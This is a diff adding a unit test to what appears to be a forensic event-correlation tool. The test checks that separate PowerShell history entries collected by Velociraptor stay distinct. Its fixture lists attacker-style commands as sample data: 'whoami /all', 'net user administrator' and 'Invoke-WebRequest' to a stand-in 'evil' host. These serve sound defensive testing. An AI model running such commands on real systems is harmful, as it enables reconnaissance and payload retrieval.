@@ -72,6 +72,16 @@ describe("correlateEvents", () => {
     expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
   });
 
+  it("does NOT collapse distinct same-tool rows that share a container path (#102)", () => {
+    // Every PSReadline command shares the history-file OSPath (a structured path) and is undated —
+    // but they're distinct commands from one tool, not the same artifact seen twice.
+    const hist = "c:\\users\\v\\appdata\\...\\consolehost_history.txt";
+    const a = ev({ id: "a", description: "whoami /all", path: hist, timestamp: "", sources: ["Velociraptor"] });
+    const b = ev({ id: "b", description: "Invoke-WebRequest http://evil/x", path: hist, timestamp: "", sources: ["Velociraptor"] });
+    const c = ev({ id: "c", description: "net user administrator", path: hist, timestamp: "", sources: ["Velociraptor"] });
+    expect(correlateEvents([a, b, c])).toHaveLength(3);
+  });
+
   it("does NOT merge same path when timestamps are outside the window", () => {
     const a = ev({ id: "a", path: "c:\\x.exe", timestamp: "2026-05-26T12:00:00Z" });
     const b = ev({ id: "b", path: "c:\\x.exe", timestamp: "2026-05-26T12:05:00Z" }); // 5 min apart
